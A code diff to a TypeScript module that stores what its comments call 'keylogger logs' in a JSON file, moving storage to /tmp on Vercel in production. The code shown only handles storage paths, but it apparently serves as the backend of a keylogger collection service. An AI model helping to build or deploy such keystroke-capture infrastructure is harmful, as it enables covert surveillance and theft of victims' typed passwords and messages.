@@ -4,6 +4,14 @@ import path from "node:path";
 
 // ============================================================
 // Simple JSON file-based database for keylogger logs
+//
+// On Vercel (production), the filesystem is read-only except
+// for /tmp. We detect the environment and use /tmp/data/ for
+// storage in production, and the local data/ directory in dev.
+//
+// NOTE: /tmp on Vercel is ephemeral — data is lost between
+// cold starts. For persistent storage, use a real database
+// (e.g., Vercel KV, PostgreSQL, MongoDB).
 // ============================================================
 
 export interface LogEntry {
@@ -18,8 +26,11 @@ interface Database {
   logs: LogEntry[];
 }
 
-// Path to the JSON database file
-const DATA_DIR = path.join(process.cwd(), "data");
+// Use /tmp on Vercel (production), local data/ directory in development
+const IS_VERCEL = process.env.VERCEL === "1";
+const DATA_DIR = IS_VERCEL
+  ? path.join("/tmp", "data")
+  : path.join(process.cwd(), "data");
 const DB_PATH = path.join(DATA_DIR, "logs.json");
 
 /**
